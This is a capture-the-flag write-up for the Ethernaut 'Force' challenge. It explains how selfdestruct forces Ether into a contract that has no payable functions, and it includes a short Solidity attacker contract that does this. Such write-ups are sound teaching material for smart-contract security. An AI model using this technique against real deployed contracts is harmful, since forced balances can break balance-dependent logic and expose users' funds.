---
layout: writeup
title: "Force"
level: "Intermediate"
category: "Ethernaut"
description: "Force-feed Ether to a contract that has no payable functions using the selfdestruct opcode."
---

## Analysis

The `Force` contract is completely empty. It has no functions, no fallback, and no receive mechanism. Normally, if you try to send Ether to this contract, the transaction will fail.

**The Flaw:**
There is a way to force Ether into any contract address regardless of its code: the `selfdestruct` opcode. When a contract is destroyed via `selfdestruct(target_address)`, all of its remaining Ether is sent to the `target_address` forcibly. This transfer happens at the EVM level and **cannot be blocked** by the receiving contract.



---

## Solution

To solve this, you must deploy a separate "Suicide" contract, fund it with some Ether, and then call `selfdestruct` pointing to the `Force` contract's address.

---

**Attacker Contract (Solidity):**

<pre class="plain-code"><code>
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

contract ForceAttacker {
    // Contract must be able to receive the initial ether
    constructor() payable {}

    function attack(address payable _target) public {
        // This will destroy this contract and force its balance to _target
        selfdestruct(_target);
    }
}
</code></pre>

---